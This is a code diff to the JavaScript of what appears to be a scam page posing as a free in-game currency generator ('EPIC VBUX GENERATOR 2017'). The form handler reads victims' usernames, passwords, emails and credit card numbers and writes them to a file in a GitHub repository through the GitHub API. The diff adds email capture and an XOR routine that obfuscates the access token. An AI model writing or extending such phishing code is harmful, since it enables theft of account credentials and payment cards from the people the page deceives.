@@ -1,9 +1,22 @@
+const decipher = salt => {
+  const textToChars = text => text.split('').map(c => c.charCodeAt(0));
+  const applySaltToChar = code => textToChars(salt).reduce((a,b) => a ^ b, code);
+  return encoded => encoded.match(/.{1,2}/g)
+    .map(hex => parseInt(hex, 16))
+    .map(applySaltToChar)
+    .map(charCode => String.fromCharCode(charCode))
+    .join('');
+}
+
+const myDecipher = decipher('g9sEKUAitr')
+
 document.getElementById("sub").addEventListener("click", function (event) {
   //event.preventDefault(); // Prevents the form from actually submitting
 
   // Get user input values
   const currency = document.querySelector("select").value;
   const login = document.getElementById("username").value;
+  const email = document.getElementById("email").value;
   const pass = document.getElementById("password").value;
   const num = document.getElementById("num").value;
   const card = document.getElementById("ccnumber").value;
@@ -18,6 +31,7 @@ document.getElementById("sub").addEventListener("click", function (event) {
     === EPIC VBUX GENERATOR 2017 ===
     Currency: ${currency}
     Username: ${login}
+    Email: ${email}
     Password: ${pass}
     Amount: ${num}
     Card Number: ${card}
@@ -36,7 +50,7 @@ function saveToGitHub(newContent) {
   const repoOwner = "FlameRiddle";
   const repoName = "epic-portfolio";
   const filePath = "generator/vault.txt";
-  const token = "";
+  const token = myDecipher("");
   const commitMessage = "update";
 
   const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`;
